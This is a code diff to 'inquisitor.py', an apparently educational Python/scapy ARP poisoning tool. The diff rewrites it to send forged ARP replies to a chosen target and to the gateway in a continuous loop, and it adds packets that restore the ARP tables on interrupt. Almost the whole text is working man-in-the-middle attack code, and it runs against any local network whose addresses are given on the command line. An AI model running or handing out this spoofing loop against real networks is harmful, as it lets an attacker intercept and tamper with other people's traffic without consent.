@@ -15,8 +15,11 @@
 from scapy.all import ARP, Ether, sendp, sniff, srp, Padding
 import argparse
 import sys
+import time
 
 ARP_TYPE = 0x0806
+WHO_HAS = 1
+IS_AT = 2
 IP_SRC = ""
 MAC_SRC = ""
 IP_TARGET = ""
@@ -46,62 +49,52 @@ def parse_arguments():
 	parser.add_argument("MAC_target", metavar="<MAC-target>",help="Define the target MAC address")
 	return parser.parse_args()
 
-def create_arppkt():
+def create_arppkt(hwsrc:str, psrc:str, hwdst:str, pdst:str):
 	trame = Ether()
 	trame.type = ARP_TYPE
 
 	packet = ARP()
 	packet.hwlen = 6
 	packet.plen = 4
-	packet.op = 2
+	packet.op = IS_AT
 	try:
-		packet.hwsrc = MAC_SRC
-		packet.psrc = IP_SRC
-		packet.hwdst = MAC_TARGET
-		packet.pdst = IP_TARGET
+		packet.hwsrc = hwsrc
+		packet.psrc = psrc
+		packet.hwdst = hwdst
+		packet.pdst = pdst
 	except OSError as error:
 		print(f"inquisitor.py: error: {error}")
 		exit(1)
 	arppckt = trame / packet
 	return arppckt
 
-def send_packet(arppkt):
-	try:
-		sendp(arppkt, verbose=False)
-	except PermissionError as error:
-		print(f"inquisitor.py: error: {error}")
-		exit(1)
-	except KeyboardInterrupt:
-		print(f"Reset arp table")
-		return
-
-def check_packet(packet):
-	print(packet)
-	if ARP in packet and packet[ARP].psrc == IP_TARGET:
-		print("it's target!")
-		if packet[ARP].pdst == "192.168.1.1" and packet[ARP].op == 1:
-			print("target request to know gateway\n")
-			print("Prepare to ARP poisonning target:")
-			arppkt = create_arppkt()
-			arppkt.show()
-			for i in range(5):
-				send_packet(arppkt)
-
 def find_gateway_macaddr():
 	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.1")
 	print("Send this request to get gateway MAC address")
-	broadcast.show()
+	# broadcast.show()
 	try:
 		response = srp(broadcast, timeout=2)
 	except:
 		print("inquisitor.py: error: cannot get mac address of gateway")
 		exit(1)
-	MAC_GATEWAY = response[0][0][1].hwsrc
-	print(f"Mac address of gateway: {MAC_GATEWAY}")
+	return response[0][0][1].hwsrc
 
 def inquisitor():
-	find_gateway_macaddr()
-	sniff(filter="arp", prn=check_packet)
+	print(f"{MAC_SRC} | {IP_TARGET} | {MAC_GATEWAY} | {MAC_SRC}")
+	target_packet = create_arppkt(MAC_SRC, IP_SRC, MAC_TARGET, IP_TARGET)
+	gateway_packet = create_arppkt(MAC_SRC, IP_TARGET, MAC_GATEWAY, IP_SRC)
+	try:
+		while True:
+			sendp(target_packet, verbose=False)
+			sendp(gateway_packet, verbose=False)
+			time.sleep(2)
+	except KeyboardInterrupt :
+		print("\nEnd of arp poisonning")
+		target_restore_packet = create_arppkt(MAC_GATEWAY, IP_SRC, MAC_TARGET, IP_TARGET)
+		gateway_restore_packet = create_arppkt(MAC_TARGET, IP_TARGET, MAC_GATEWAY, IP_SRC)
+		sendp(target_restore_packet, verbose=False)
+		sendp(gateway_restore_packet, verbose=False)
+		exit(0)
 
 if __name__ == "__main__":
 	args = parse_arguments()
@@ -111,4 +104,5 @@ if __name__ == "__main__":
 	MAC_SRC = args.MAC_src
 	IP_TARGET = args.IP_target
 	MAC_TARGET = args.MAC_target
+	MAC_GATEWAY = find_gateway_macaddr()
 	inquisitor()
